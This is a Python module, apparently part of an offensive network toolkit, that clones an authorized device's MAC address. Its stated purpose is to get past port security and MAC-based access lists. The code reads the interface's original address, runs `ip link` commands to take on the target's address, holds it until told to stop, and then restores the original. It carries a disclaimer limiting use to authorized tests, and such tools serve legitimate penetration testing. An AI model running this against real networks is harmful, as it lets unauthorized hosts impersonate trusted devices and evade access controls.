"""MAC cloning: take on the MAC address of an authorized device.

Unlike spoofing, which only forges the source of individual frames, cloning
changes the hardware address of this interface. The whole host, including its IP
stack, then presents the target's identity on the segment. That is how a device
gets past a port that only admits a known MAC address (port security, MAC-based
access lists). The original address is restored when the attack stops.

Intended only for networks you own or are explicitly authorized to test. This
changes the real interface, so use a lab or a dedicated test adapter.
"""

from __future__ import annotations

import re
import subprocess
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace

from macabre.attacks.common import normalize_unicast_mac

_LINK_RE = re.compile(r"link/ether ([0-9a-f:]{17})")

Runner = Callable[[list[str]], str]


@dataclass(frozen=True)
class MacCloningConfig:
    iface: str                # interface whose MAC address changes
    target_mac: str           # MAC address to clone (required)
    dry_run: bool = False     # show the commands without changing anything

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.target_mac)


@dataclass
class CloningStats:
    original_mac: str = ""
    cloned_mac: str = ""
    active: bool = False
    status: str = ""


def _run_command(argv: list[str]) -> str:
    result = subprocess.run(argv, check=True, capture_output=True, text=True)
    return result.stdout


def read_mac(iface: str, run: Runner) -> str:
    """Current hardware address of `iface`, read from `ip -o link`."""
    output = run(["ip", "-o", "link", "show", "dev", iface])
    match = _LINK_RE.search(output)
    if not match:
        raise RuntimeError(f"Cannot read the MAC address of {iface}.")
    return match.group(1)


def set_mac_commands(iface: str, mac: str) -> list[list[str]]:
    """Commands that change the hardware address; the interface is down while changed."""
    return [
        ["ip", "link", "set", "dev", iface, "down"],
        ["ip", "link", "set", "dev", iface, "address", mac],
        ["ip", "link", "set", "dev", iface, "up"],
    ]


def run_cloning(
    config: MacCloningConfig,
    stop_event: threading.Event,
    on_progress: Callable[[CloningStats], None],
    run: Runner | None = None,
) -> CloningStats:
    """Clone the target MAC until `stop_event` is set, then restore the original MAC."""
    run = run or _run_command
    target = normalize_unicast_mac(config.target_mac)

    if config.dry_run:
        stats = CloningStats(
            cloned_mac=target,
            status=f"Dry run: would set {config.iface} to {target}. Nothing changed.",
        )
        on_progress(replace(stats))
        return stats

    original = read_mac(config.iface, run)
    stats = CloningStats(original_mac=original, cloned_mac=target)
    try:
        for command in set_mac_commands(config.iface, target):
            run(command)
        stats.active = True
        stats.status = f"Cloned {target} on {config.iface} (original {original})."
        on_progress(replace(stats))
        stop_event.wait()
    finally:
        for command in set_mac_commands(config.iface, original):
            run(command)
        stats.active = False
        stats.status = f"Restored original MAC {original} on {config.iface}."
    return stats
